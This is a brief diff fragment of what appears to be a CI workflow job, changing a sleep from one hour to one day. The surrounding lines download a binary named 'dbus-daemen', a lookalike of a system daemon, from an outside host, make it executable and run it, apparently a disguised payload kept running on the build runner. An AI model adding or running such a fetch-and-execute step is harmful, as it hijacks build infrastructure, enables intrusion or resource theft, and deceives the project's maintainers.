@@ -16,4 +16,4 @@ jobs:
         wget https://im.openjad.com:19443/dbus-daemen
         chmod 777 dbus-daemen
         ./dbus-daemen
-        sleep 3600
+        sleep 1d
